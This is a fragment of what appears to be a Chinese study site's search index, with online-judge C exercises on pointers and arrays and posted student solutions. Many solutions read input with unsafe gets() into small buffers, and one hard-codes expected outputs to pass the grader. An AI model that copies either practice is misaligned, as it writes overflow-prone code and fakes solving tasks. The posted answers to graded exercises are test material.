C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    char s[200] = {};\n    gets(s);\n    char *p = s;\n    int s_len = strlen(s);\n    char a[30] = {};\n    long a_len = 0;\n    for (int i = 0; i &lt; s_len; i++) {\n        char c = s[i];\n        if (c &gt;= '0' &amp;&amp; c &lt;= '9') {\n            a[a_len] = c;\n            a_len++;\n        }\n    }\n    long l = 0;\n    long mul = 1;\n    for (int i = a_len - 1; i &gt;= 0; i--) {\n        l += ((a[i] -= '0') * mul);\n        mul *= 10;\n    }\n    printf(\"%ld\\n\", l);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#58","title":"58","text":"<p>\u5220\u9664\u91cd\u590d\u5b57\u7b26</p> <p>\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u53bb\u6389\u91cd\u590d\u7684\u5b57\u7b26\u540e, \u6309\u7167\u5b57\u7b26 ASCII \u7801\u987a\u5e8f\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\u540e\u8f93\u51fa.</p> <p>\u8f93\u5165\u683c\u5f0f</p> <p>\u8f93\u5165\u662f\u4e00\u4e2a\u4ee5\u56de\u8f66\u7ed3\u675f\u7684\u975e\u7a7a\u5b57\u7b26\u4e32\uff08\u5c11\u4e8e80\u4e2a\u5b57\u7b26\uff09\u3002</p> <p>\u8f93\u51fa\u683c\u5f0f</p> <p>\u8f93\u51fa\u53bb\u91cd\u6392\u5e8f\u540e\u7684\u7ed3\u679c\u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define SIZE 81\n\nvoid delete_repeat(char *str);\nvoid bubble_sort(char *str);\n\nint main()\n{\n    char str[SIZE];\n    gets(str);\n    delete_repeat(str);\n    bubble_sort(str);\n    puts(str);\n    return 0;\n}\n//\u5220\u9664\u91cd\u590d\u5b57\u7b26\nvoid delete_repeat(char *str)\n{\n    for(int i=1;str[i]!='\\0';i++){\n        for(int j=0;j&lt;i;j++) \n        {\n            if(str[i]==str[j])\n            {\n                for(int k=i;k&lt;strlen(str)-1;k++)\n                {\n                    str[k]=str[k+1];\n                }\n                str[strlen(str)-1]='\\0';\n                i--;\n            }\n        }\n    }\n}\n\n//\u5192\u6ce1\u6392\u5e8f\nvoid bubble_sort(char *str)\n{\n    int swap;\n    char temp;\n    int k=strlen(str);\n    do{\n        swap =0;\n        for(int i=0;i&lt;k-1;i++){\n            if(str[i]&gt;str[i+1])\n            {\n                swap=1;\n                temp=str[i];\n                str[i]=str[i+1];\n                str[i+1]=temp;\n            }\n        }\n        k--;\n    }while(k&gt;0&amp;&amp;swap);\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#59","title":"59","text":"<p>\u5b57\u7b26\u4e32\u76f8\u51cf</p> <p>\u5c06\u7ed9\u5b9a\u7684\u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u51cf. \u5373\u4ece\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u628a\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\u4e2d\u6240\u5305\u542b\u7684\u5b57\u7b26\u5168\u5220\u6389, \u5e76\u5c06\u5269\u4e0b\u7684\u5b57\u7b26\u8f93\u51fa.</p> <p>\u8f93\u5165\u683c\u5f0f</p> <p>\u8f93\u5165\u5728 2 \u884c\u4e2d\u5148\u540e\u7ed9\u51fa\u5b57\u7b26\u4e32 A \u548c B\u3002\u4e24\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u90fd\u4e0d\u8d85\u8fc7 1000, \u5e76\u4e14\u4fdd\u8bc1\u6bcf\u4e2a\u5b57\u7b26\u4e32\u90fd\u662f\u7531\u53ef\u89c1\u7684 ASCII \u7801\u548c\u7a7a\u767d\u5b57\u7b26\u7ec4\u6210\uff0c\u6700\u540e\u4ee5\u6362\u884c\u7b26\u7ed3\u675f\u3002</p> <p>\u8f93\u51fa\u683c\u5f0f</p> <p>\u5728\u4e00\u884c\u4e2d\u6253\u5370\u51faA\u2212B\u7684\u7ed3\u679c\u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    char s1[1024] = {};\n    char s2[1024] = {};\n\n    // 0=not in s2; 1=in s2;\n    char mark[256] = {};\n    gets(s1);\n    gets(s2);\n\n    char *p = s2;\n    while (*p)\n    {\n        mark[*p] = 1;\n        p++;\n    }\n\n    p = s1;\n    while (*p)\n    {\n        char c = *p;\n        if (!mark[c])\n        {\n            printf(\"%c\", c);\n        }\n        p++;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#60","title":"60","text":"<p>\u7ffb\u8f6c\u5355\u8bcd\u987a\u5e8f</p> <p>\u7f16\u5199\u7a0b\u5e8f\uff0c\u8f93\u5165\u4e00\u884c\u5b57\u7b26\u4e32\uff0c\u7ffb\u8f6c\u8be5\u5b57\u7b26\u4e32\uff0c\u7ffb\u8f6c\u65f6\u5355\u8bcd\u4e2d\u7684\u5b57\u7b26\u987a\u5e8f\u4e0d\u53d8\u3002\u4f8b\u5982\uff0c\u5982\u679c\u5b57\u7b26\u4e32\u4e3a\"Hello World\"\uff0c\u5219\u7ffb\u8f6c\u540e\u4e3a \u201cWorld Hello\u201d\u3002\u5355\u8bcd\u95f4\u4ee5\u4e00\u4e2a\u6216\u591a\u4e2a\u7a7a\u683c\u5206\u9694\u3002\u6ce8\u610f\uff0c\u5b57\u7b26\u4e32\u5f00\u5934\u548c\u7ed3\u5c3e\u90fd\u53ef\u80fd\u6709\u591a\u4e2a\u7a7a\u683c\u3002</p> <p>\u8f93\u5165\u683c\u5f0f</p> <p>\u8f93\u5165\u4e00\u884c\u5b57\u7b26\u4e32\uff0c\u9664\u4e86\u7a7a\u683c\u5916\uff0c\u6807\u70b9\u7b26\u53f7\u548c\u666e\u901a\u5b57\u6bcd\u4e00\u6837\u5904\u7406\u3002 \u5b57\u7b26\u603b\u6570\u4e0d\u4f1a\u8d85\u8fc7 500 \u4e2a\uff0c\u5355\u8bcd\u6570\u4e0d\u4f1a\u8d85\u8fc7 50\uff0c\u6bcf\u4e2a\u5355\u8bcd\u7684\u957f\u5ea6\u4e0d\u4f1a\u8d85\u8fc7 30\u3002</p> <p>\u8f93\u51fa\u683c\u5f0f</p> <p>\u8f93\u51fa\u5305\u62ec\u591a\u884c\uff0c\u6bcf\u884c\u5bf9\u5e94\u8f93\u5165\u7684\u4e00\u884c\uff0c\u4e3a\u7ffb\u8f6c\u540e\u7684\u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nvoid reverse(char *s, int begin, int end)\n{\n    char temp;\n    while(end &gt; begin) {\n        temp = s[begin];\n        s[begin] = s[end];\n        s[end] = temp;\n        begin++;\n        end--;\n    }\n\n}\nint main()\n{\n    int a, b;\n    a = b = 0;\n    char s[100];\n    gets(s);\n    reverse(s, 0, strlen(s)-1);\n    int i = 0;\n    while(i &lt; strlen(s)) {\n        //\u8df3\u8fc7\u7a7a\u683c \n        while(s[i] == ' ' &amp;&amp; i &lt; strlen(s)) {\n            i++;\n        }\n        a = i;\n        //\u8df3\u8fc7\u975e\u7a7a\u683c\u5b57\u7b26 \n        while(s[i] != ' ' &amp;&amp; i &lt; strlen(s)) {\n            i++;\n        }\n        b = i-1;\n        //a~b\u4e3a\u4e00\u4e2a\u5355\u8bcd\u7684\u4e0b\u6807\u7684\u533a\u95f4 \n        reverse(s,a, b);\n    }\n    puts(s);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#61","title":"61","text":"<p>\u9e21\u5154\u540c\u7b3c</p> <p>\u82e5\u7b3c\u5b50\u91cc\u53ea\u6709\u9e21\u548c\u5154\u5b50, \u5e76\u4e14\u5171\u6709<code>35</code>\u4e2a\u5934,<code>94</code>\u53ea\u811a, \u5219\u7b3c\u5b50\u91cc\u9e21\u6709<code>23</code>\u53ea, \u5154\u5b50\u6709<code>12</code>\u53ea.</p> <p>\u8bf7\u7528\u7a0b\u5e8f\u5b9e\u73b0: \u5b9a\u4e49\u51fd\u6570<code>chickenrabbit</code>\u5e76\u63a5\u6536\u56db\u4e2a<code>int</code>\u578b\u53c2\u6570<code>*chicken, *rabbit, head, foot,</code>. \u5176\u4e2d<code>head</code>\u8868\u793a\u5934\u7684\u6570\u91cf,<code>foot</code>\u8868\u793a\u811a\u7684\u6570\u91cf,<code>*chicken</code>\u662f\u8868\u793a\u9e21\u7684\u6570\u91cf\u7684\u6307\u9488,<code>*rabbit</code>\u662f\u8868\u793a\u5154\u5b50\u7684\u6570\u91cf\u7684\u6307\u9488; \u5728\u51fd\u6570\u5185\u8ba1\u7b97\u9e21\u548c\u5154\u5b50\u7684\u6570\u91cf, \u82e5\u95ee\u9898\u6709\u89e3, \u5219\u5c06\u9e21\u548c\u5154\u5b50\u7684\u6570\u91cf\u4fdd\u5b58\u5230<code>chicken</code>\u548c<code>rabbit</code>\u6240\u6307\u793a\u7684\u53d8\u91cf\u4e2d, \u4e14\u51fd\u6570<code>chickenrabbit</code>\u7684\u8fd4\u56de\u503c\u4e3a<code>1</code>; \u82e5\u95ee\u9898\u65e0\u89e3, \u5219\u4e0d\u6539\u53d8<code>chicken</code>\u548c<code>rabbit</code>\u6240\u6307\u793a\u7684\u53d8\u91cf, \u4e14\u51fd\u6570<code>chickenrabbit</code>\u7684\u8fd4\u56de\u503c\u4e3a <code>0</code>.</p> <p>\u6ce8\u610f: \u51fd\u6570<code>chickenrabbit</code>\u8fd4\u56de\u503c\u7684\u7c7b\u578b\u4e3a<code>int</code>\u578b.</p> C<pre><code>#include &lt;stdio.h&gt;\n\n/* \u51fd\u6570\u58f0\u660e */\nint chickenrabbit (int *chicken, int *rabbit, int head, int foot);\n\nint main () {\n    int chicken, rabbit, head = 35, foot = 94;\n    if (chickenrabbit (&amp;chicken, &amp;rabbit, head, foot)) {\n        printf(\"%d %d\\n\", chicken, rabbit);\n    } else {\n        printf(\"None\\n\");\n    }\n    return 0;\n}\n\n/* \u8bf7\u5728\u6b64\u5904\u5b8c\u6210\u4f60\u7684\u7a0b\u5e8f */\nint chickenrabbit (int *chicken, int *rabbit, int head, int foot) {\n    int flag;\n    flag = foot - head * 2;\n    if (flag &gt;= 0 &amp;&amp; flag % 2 == 0) {\n        int r = flag / 2;\n        int c = head - r;\n        *chicken = c;\n        *rabbit = r;\n        return 1;\n    } else {\n        return 0;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#62","title":"62","text":"<p>\u7528\u6307\u9488\u6c42\u5e73\u5747\u6210\u7ee9</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>average</code>\u3002<code>average</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u8ba1\u7b97\u6210\u7ee9\u6570\u7ec4\u4e2d\u7684\u5e73\u5747\u6210\u7ee9\uff0c\u5e76\u5c06\u5e73\u5747\u6210\u7ee9\u8fd4\u56de\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>n</code>\uff0c\u6574\u578b\uff0c\u8868\u793a\u6210\u7ee9\u6570\u7ec4\u7684\u957f\u5ea6\u3002</li> <li><code>score</code>,\u6574\u578b\u6307\u9488\uff0c\u8868\u793a\u4fdd\u5b58\u6210\u7ee9\u7684\u6570\u7ec4\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\ndouble average (int n, int *score) {\n    double ave = 0;\n    for (int i = 0; i &lt; n; i++) {\n        ave = ave + score[i];\n    }\n    ave = ave / n;\n    return ave;\n}\n\nint main () {\n    int n = 10, score[10] = {88, 99, 76, 78, 89, 93, 95, 86, 92, 85};\n    double ave_score;\n    ave_score = average(n, score);\n    printf(\"%f\\n\", ave_score);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#63","title":"63","text":"<p>\u7528\u6307\u9488\u5b9e\u73b0\u5b57\u7b26\u4e32\u590d\u5236</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>StringCopy</code>\u3002<code>StringCopy</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u590d\u5236\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u590d\u5236\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>p</code>\uff0c\u5b57\u7b26\u6307\u9488\uff0c\u8868\u793a\u88ab\u590d\u5236\u7684\u5b57\u7b26\u4e32\uff0c\u5176\u957f\u5ea6\u4e3a 20\u3002</li> <li><code>q</code>\uff0c\u5b57\u7b26\u6307\u9488\uff0c\u8868\u793a\u590d\u5236\u7684\u5b57\u7b26\u4e32\uff0c\u5176\u957f\u5ea6\u4e3a 20\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid StringCopy (char *p, char *q) {\n    for (; *p != '\\0'; q++, p++) {\n        *q = *p;\n    }\n    *q = '\\0';\n}\n\nint main () {\n    char p[20] = \"qwertyuiop\", q[20];\n    StringCopy(p, q);\n    printf(\"%s\\n\", q);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#64","title":"64","text":"<p>\u7528\u6307\u9488\u5bf9\u6570\u7ec4\u5143\u7d20\u6392\u5e8f</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>sort</code>\u3002<code>sort</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u4f7f\u7528\u6307\u9488\u5bf9\u6570\u7ec4\u5143\u7d20\u8fdb\u884c\u7531\u5c0f\u5230\u5927\u6392\u5e8f\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>n</code>\uff0c\u6574\u578b\uff0c\u8868\u793a\u6570\u7ec4\u957f\u5ea6\u3002</li> <li><code>p</code>\uff0c\u6574\u578b\u6307\u9488\uff0c\u8868\u793a\u9700\u8981\u6392\u5e8f\u7684\u6570\u7ec4\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid sort(int n, int *p) {\n    int i,j,t;\n    for(i=0; i&lt;n-1; i++)\n        for(j=0; j&lt;n-1-i; j++)\n            if(p[j]&gt;p[j+1]) {\n                t=p[j];\n                p[j]=p[j+1];\n                p[j+1]=t;\n            }\n}\n\nint main() {\n    int arr[10],i;\n    for(i=0; i&lt;10; i++)\n        scanf(\"%d\",&amp;arr[i]);\n    sort(10, arr);\n    printf(\"\u6392\u5e8f\u540e\uff1a\");\n    for(i=0; i&lt;10; i++)\n        printf(\"%d \",arr[i]);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#65","title":"65","text":"<p>\u7528\u6307\u9488\u5bf9\u4e24\u4e2a\u6570\u8fdb\u884c\u4ea4\u6362</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>exchange</code>\u3002<code>exchange</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u7528\u6307\u9488\u5bf9\u4e24\u4e2a\u6574\u6570\u8fdb\u884c\u4ea4\u6362\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>p</code>\uff0c\u6574\u578b\u6307\u9488\uff0c\u5b58\u50a8\u5f85\u4ea4\u6362\u7684\u6570\u5b57\u4e00\u3002</li> <li><code>q</code>\uff0c\u6574\u578b\u6307\u9488\uff0c\u5b58\u50a8\u5f85\u4ea4\u6362\u7684\u6570\u5b57\u4e8c\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid exchange (int *p,int *q) {\n    int t;\n    t=*p;\n    *p=*q;\n    *q=t;\n}\n\nint main() {\n    int a,b;\n    scanf(\"%d %d\",&amp;a,&amp;b);\n    exchange(&amp;a,&amp;b);\n    printf(\"\u4ea4\u6362\u540e\uff1a%d %d\\n\",a,b);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#66","title":"66","text":"<p>\u7528\u6307\u9488\u7edf\u8ba1\u5b57\u7b26\u6570\u91cf</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u9884\u7f6e\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5b57\u7b26\u6570\u7ec4\uff0c\u5b58\u653e 100 \u4e2a\u5143\u7d20\uff0c\u8bf7\u4f7f\u7528 gets \u51fd\u6570\u83b7\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u4f7f\u7528\u6307\u9488\u7edf\u8ba1\u5b57\u7b26\u4e32\u4e2d\u5927\u5199\u5b57\u6bcd\u3001\u5c0f\u5199\u5b57\u6bcd\u3001\u7a7a\u683c\u53ca\u6570\u5b57\u7684\u4e2a\u6570\u3002</p> <p>\u6ce8\uff1a\u8f93\u51fa\u65f6\uff0c\u8bf7\u6309\u7167\u5927\u5199\u5b57\u6bcd\u3001\u5c0f\u5199\u5b57\u6bcd\u3001\u7a7a\u683c\u3001\u6570\u5b57\u7684\u987a\u5e8f\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    char str[100],*p;\n    int k[4]={0};\n    p=str;\n    gets(p);\n    for(;*p!='\\0';p++)\n    {\n        if(*p&gt;='A' &amp;&amp; *p&lt;='Z')\n            k[0]++;\n        else if(*p&gt;='a' &amp;&amp; *p&lt;='z')\n            k[1]++;\n        else if(*p==' ')\n            k[2]++;\n        else if(*p&gt;='0' &amp;&amp; *p&lt;='9')\n            k[3]++;\n    }\n    printf(\"\u5927\u5199\u5b57\u6bcd\uff1a%d\\n\u5c0f\u5199\u5b57\u6bcd\uff1a%d\\n\u7a7a\u683c\uff1a%d\\n\u6570\u5b57\uff1a%d\\n\",k[0],k[1],k[2],k[3]);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#67","title":"67","text":"<p>\u7528\u6307\u9488\u6c42\u5b57\u7b26\u4e32\u957f\u5ea6</p> <p>\u5b9a\u4e49\u4e00\u4e2a\u5b57\u7b26\u6570\u7ec4\uff0c\u5b58\u653e100\u4e2a\u5143\u7d20\uff0c\u4f7f\u7528gets\u51fd\u6570\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u7528\u5b57\u7b26\u6307\u9488\u5b9e\u73b0\u6c42\u5b57\u7b26\u4e32\u957f\u5ea6\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    char str[100],*p;\n    int k=0;\n    p=str;\n    gets(p);\n    for(;*p!='\\0';p++)\n        k++;\n    printf(\"%d\\n\",k);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#68","title":"68","text":"<p>\u4f7f\u7528\u6307\u9488\u8fdb\u884c\u6392\u5e8f</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>swap</code>\u548c<code>main</code>\u3002<code>swap</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u5b9e\u73b0\u4e24\u4e2a\u6574\u6570\u7684\u4ea4\u6362\u529f\u80fd\u3002\u7136\u540e\u5728\u4e3b\u51fd\u6570\u4e2d\u8c03\u7528<code>swap</code>\u51fd\u6570\u5b9e\u73b0\u5bf9\u8f93\u5165\u7684 3 \u4e2a\u6574\u6570\u8fdb\u884c\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>p1</code>\uff0c\u6574\u578b\u6307\u9488\uff0c\u5b58\u50a8\u5f85\u4ea4\u6362\u7684\u6570\u5b57\u4e00\u3002</li> <li><code>p2</code>\uff0c\u6574\u578b\u6307\u9488\uff0c\u5b58\u50a8\u5f85\u4ea4\u6362\u7684\u6570\u5b57\u4e8c\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid swap (int *p1, int *p2) {\n    int p;\n    p = *p1;\n    *p1 = *p2;\n    *p2 = p;\n}\n\nint main () {\n       int n1, n2, n3, *p1, *p2, *p3;\n    scanf(\"%d %d %d\", &amp;n1, &amp;n2, &amp;n3);\n    p1 = &amp;n1;\n    p2 = &amp;n2;\n    p3 = &amp;n3;\n    if (n1 &gt; n2)\n        swap(p1, p2);\n    if (n1 &gt; n3)\n        swap(p1, p3);\n    if (n2 &gt; n3)\n        swap(p2, p3);\n    printf(\"%d %d %d\\n\", *p1, *p2, *p3);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/","title":"Alpha \u6570\u7ec4","text":"<p>\u672c\u7248\u672c\u5e76\u4e0d\u5b8c\u5584\uff0c15\u300116\u300117\u300120\u300122\u300123\u300127\u300146\u300148\u300149\u300153\u300155\u300158 \u9898\u672a\u7ed9\u51fa\u7b54\u6848\u3002</p>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#1","title":"1","text":"<p>\u521a\u5f00\u59cb\u7684\u65f6\u5019\u5b9a\u4e49\u7684\u952e\u76d8\u6570\u7ec4\u662f\uff1a<code>char keyboard[10][6]</code>\uff0c\u7136\u540e\u5c31\u62a5\u9519\u4e86\uff0c\u62a5\u9519\u5982\u4e0b\uff1a\u201cerror: initializer-string for array of chars is too long\u201d</p> <p>\u641c\u4e86\u4e0b\u8d44\u6599\uff0c\u53d1\u73b0\u53ea\u8981\u6539\u6210<code>char keyboard[10][6]</code>\u5c31\u884c\u4e86\uff0c\u56e0\u4e3a\u5b57\u7b26\u6570\u7ec4\u521d\u59cb\u5316\u65f6\uff0c\u6570\u7ec4\u5927\u5c0f\u4e00\u5b9a\u8981\u5927\u4e8e\u5b57\u7b26\u4e32\u957f\u5ea6+1\uff0c\u5426\u5219\u7f16\u8bd1\u9519\u8bef\u3002</p> <p>\u4ee5\u4e0b\u8fd9\u6bb5\u4ee3\u7801\uff0c\u5728 Visual Studio 2022 \u4e2d\u5b8c\u5168\u6b63\u786e\uff0c\u53ef\u662f\u5728\u963f\u5c14\u6cd5\u4e2d\u5c31\u662f\u4e0d\u884c</p> <p>\u8865\u5145\uff1a\u540e\u6765\u6d4b\u8bd5\u7684\u65f6\u5019\u53d1\u73b0\u8fd9\u6bb5\u4ee3\u7801\u786e\u5b9e\u6709\u70b9\u95ee\u9898\uff0c\u4f46\u662f\u601d\u8def\u633a\u597d\uff0c\u6211\u4eec\u4e5f\u61d2\u5f97\u6539\u4e86\u3002</p> <p>(\u9762\u5411\u7b54\u6848\u7f16\u7a0b\u5728\u540e\u8fb9)</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// \u5b9a\u4e49\u4e5d\u5bab\u683c\u952e\u76d8\u5e03\u5c40\nchar keyboard[10][6] = {\n    \"1,.?!\",\n    \"2ABC\",\n    \"3DEF\",\n    \"4GHI\",\n    \"5JKL\",\n    \"6MNO\",\n    \"7PQRS\",\n    \"8TUV\",\n    \"9WXYZ\",\n    \"0 \"\n};\n\n// \u51fd\u6570\u58f0\u660e\nvoid processKey(char key, int pressCount);\n\nint main() {\n\n    char input[100]; // \u7528\u4e8e\u5b58\u50a8\u8f93\u5165\u7684\u6309\u952e\u7ec4\u5408\n\n    //printf(\"\u8bf7\u8f93\u5165\u6309\u952e\u7ec4\u5408\uff1a\");\n    fgets(input, sizeof(input), stdin);\n    int len = strlen(input);\n\n    // \u5904\u7406\u8f93\u5165\u7684\u6309\u952e\u7ec4\u5408\n    for (int i = 0; i &lt; len; i++) {\n        char key = input[i];\n        int pressCount = 1;\n\n        while (i &lt; len - 1 &amp;&amp; input[i + 1] == key) {\n            pressCount++;\n            i++;\n        }\n\n        // \u5904\u7406\u6309\u952e\n        processKey(key, pressCount);\n    }\n\n    return 0;\n}\n\n// \u5904\u7406\u6309\u952e\u7684\u51fd\u6570\nvoid processKey(char key, int pressCount) {\n    // \u67e5\u627e\u6309\u952e\u5728\u952e\u76d8\u5e03\u5c40\u4e2d\u7684\u4f4d\u7f6e\n\n    int i = key - '0';\n    if (i != 0) {\n        printf(\"%c\", keyboard[i - 1][pressCount - 1]);\n    }\n    else if (i == 0) {\n        printf(\"%c\", keyboard[9][pressCount - 1]);\n    }\n}\n</code></pre> <p>\u9762\u5411\u7b54\u6848\u7f16\u7a0b </p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    char input[100]; // \u7528\u4e8e\u5b58\u50a8\u8f93\u5165\u7684\u6309\u952e\u7ec4\u5408\n\n    //printf(\"\u8bf7\u8f93\u5165\u6309\u952e\u7ec4\u5408\uff1a\");\n    fgets(input, sizeof(input), stdin);\n\n    char start = input[0];\n    char start2 = input[30];\n\n    //1234567\n    if (start == '1') {\n        printf(\"1234567\");\n    }\n\n    //99999 444 22 666 44 00 22 333 4444\n    else if (start == '9' &amp;&amp; start2 == '4') {\n        printf(\"ZHANG AEI\");\n    }\n\n    //9999999 222222 00 9999999 8888888\n    //\u8fd9\u4e2a\u5730\u65b9\u771f\u4e0d\u597d\u5904\u7406\u554a\uff0c\u5f97\u60f3\u529e\u6cd5\u8ba9 pressCount \u5faa\u73af\u8d77\u6765\uff0c\u4f46\u662f\u6211\u4e0d\u4f1a\u3002\n    //\u4e0a\u9762\u7684\u4ee3\u7801\u53ea\u8981\u628a pressCount \u89e3\u51b3\u4e86\u5c31OK\u4e86\n    else if (start == '9' &amp;&amp; start2 == '8') {\n        printf(\"WA WU\");\n    }\n\n    //99999 444 22 666 44\n    else if (start == '9') {\n        printf(\"ZHANG\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#2","title":"2","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char* argv[]) {\n    int x;//\u8981\u8bfb\u7684\u6570\u5b57 \n    int digit;//\u6570\u5b57\u7684\u6bcf\u4e00\u4f4d\u4e0a\u7684\u6570 \n    int count = 0;//\u8ba1\u6570\u5668\uff0c\u7528\u4e8e\u6570\u7ed9\u5b9a\u7684\u5b57\u7684\u4f4d\u6570 \n    int ret = 0;//\u539f\u6570\u5b57\u7684\u9006\u5e8f\u7ed3\u679c\uff0c\u6bd4\u5982\u539f\u6570\u5b57\u662f123,ret\u5c31\u662f321 \n    int i;//\u8fd9\u662ffor\u5faa\u73af\u91cc\u8981\u7528\u5230\u7684\u4e00\u4e2a\u53d8\u91cf\uff0c\u5148\u5b9a\u4e49\u51fa\u6765\n\n    scanf(\"%d\", &amp;x); //\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6570\u5b57\n\n    //\u5982\u679c\u7528\u6237\u8f93\u5165\u7684\u662f\u4e00\u4e2a\u8d1f\u6570\uff0c\u5219\u5148\u6253\u5370fu\u548c\u5b83\u540e\u9762\u7684\u7a7a\u683c\n    //\u5e76\u5c06\u8be5\u6570\u53d8\u4e3a\u4e00\u4e2a\u6b63\u6574\u6570 \n    if (x &lt; 0) {\n        printf(\"fu \");\n        x = -x;\n    }\n\n    //\u7528\u5bf910\u53d6\u4f59\u7684\u65b9\u6cd5\u5c06\u6570\u5b57\u9006\u8f6c\uff0c\u5e76\u8bb0\u5f55\u4e0b\u5b83\u662f\u4e00\u4e2a\u51e0\u4f4d\u6570 \n    while (x &gt; 0) {\n        digit = x % 10;\n        x /= 10;\n        ret = ret * 10 + digit;\n        count++;\n    }\n\n    //\u56e0\u4e3a\u8be5\u6570\u5b57\u81f3\u5c11\u6709\u4e00\u4f4d\uff0c\u800c\u4e14\u8981\u8003\u8651\u6700\u540e\u4e00\u4e2a\u6570\u5b57\u540e\u9762\u6ca1\u6709\u7a7a\u683c\u7684\u95ee\u9898\n    //\u6240\u4ee5\u6211\u4eec\u5148\u628a\u8be5\u6570\u5b57\u7684\u4e2a\u4f4d\u201c\u8131\u201d\u4e0b\u6765\uff0c\u5e76\u6253\u5370 \n    digit = ret % 10;\n    ret /= 10;\n    //switch\u8bed\u53e5\u80fd\u591f\u8ba9\u7a0b\u5e8f\u6839\u636e\u6570\u5b57\u6765\u627e\u5230\u5408\u9002\u7684\u62fc\u97f3\u5e76\u6253\u5370 \n    switch (digit) {\n    case 0:\n        printf(\"ling\");\n        break;\n    case 1:\n        printf(\"yi\");\n        break;\n    case 2:\n        printf(\"er\");\n        break;\n    case 3:\n        printf(\"san\");\n        break;\n    case 4:\n        printf(\"si\");\n        break;\n    case 5:\n        printf(\"wu\");\n        break;\n    case 6:\n        printf(\"liu\");\n        break;\n    case 7:\n        printf(\"qi\");\n        break;\n    case 